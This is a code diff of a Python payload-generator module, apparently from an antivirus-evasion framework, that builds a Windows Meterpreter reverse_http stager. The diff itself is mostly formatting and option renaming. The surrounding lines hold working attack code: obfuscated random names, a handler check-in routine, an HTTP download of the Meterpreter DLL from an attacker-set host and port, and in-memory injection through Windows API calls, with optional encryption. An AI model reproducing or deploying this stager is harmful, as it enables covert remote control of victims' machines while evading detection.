@@ -12,22 +12,24 @@ from modules.common import encryption
 
 
 class Payload:
-    
+
     def __init__(self):
         # required options
         self.description = "pure windows/meterpreter/reverse_http stager, no shellcode"
         self.language = "python"
         self.extension = "py"
         self.rating = "Excellent"
-        
-        # options we require user interaction for- format is {Option : [Value, Description]]}
-        self.required_options = {"compile_to_exe"   : ["Y", "Compile to an executable"],
-                                 "use_pyherion"     : ["N", "Use the pyherion encrypter"],
-                                 "LHOST"            : ["", "IP of the metasploit handler"],
-                                 "LPORT"            : ["8080", "Port of the metasploit handler"]}
-        
+
+        # options we require user interaction for- format is {OPTION : [Value, Description]]}
+        self.required_options = {
+                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
+                                    "USE_PYHERION"   : ["N", "Use the pyherion encrypter"],
+                                    "LHOST"          : ["", "IP of the Metasploit handler"],
+                                    "LPORT"          : ["8080", "Port of the Metasploit handler"]
+                                }
+
     def generate(self):
-    
+
         payloadCode = "import urllib2, string, random, struct, ctypes, time\n"
 
         # randomize everything, yo'
@@ -56,14 +58,14 @@ class Payload:
 
         # helper method that returns the sum of all ord values in a string % 0x100
         payloadCode += "def %s(s): return sum([ord(ch) for ch in s]) %% 0x100\n" %(sumMethodName)
-        
+
         # method that generates a new checksum value for checkin to the meterpreter handler
         payloadCode += "def %s():\n\tfor x in xrange(64):\n" %(checkinMethodName)
         payloadCode += "\t\t%s = ''.join(random.sample(string.ascii_letters + string.digits,3))\n" %(randBaseName)
         payloadCode += "\t\t%s = ''.join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))\n" %(randLettersName)
         payloadCode += "\t\tfor %s in %s:\n" %(randLetterSubName, randLettersName)
         payloadCode += "\t\t\tif %s(%s + %s) == 92: return %s + %s\n" %(sumMethodName, randBaseName, randLetterSubName, randBaseName, randLetterSubName)
-        
+
         # method that connects to a host/port over http and downloads the hosted data
         payloadCode += "def %s(%s,%s):\n" %(downloadMethodName, hostName, portName)
         payloadCode += "\t" + proxy_var + " = urllib2.ProxyHandler()\n"
@@ -87,13 +89,13 @@ class Payload:
         payloadCode += "\t\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(%s),%s, ctypes.c_int(len(%s)))\n" %(ptrName, bufName, byteArrayName)
         payloadCode += "\t\t%s = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(%s),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n" %(handleName, ptrName)
         payloadCode += "\t\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(%s),ctypes.c_int(-1))\n" %(handleName)
-        
+
         # download the metpreter .dll and inject it
         payloadCode += "%s = ''\n" %(data2Name)
         payloadCode += "%s = %s(\"%s\", %s)\n" %(data2Name, downloadMethodName, self.required_options["LHOST"][0], self.required_options["LPORT"][0])
         payloadCode += "%s(%s)\n" %(injectMethodName, data2Name)
 
-        if self.required_options["use_pyherion"][0].lower() == "y":
+        if self.required_options["USE_PYHERION"][0].lower() == "y":
             payloadCode = encryption.pyherion(payloadCode)
 
         return payloadCode
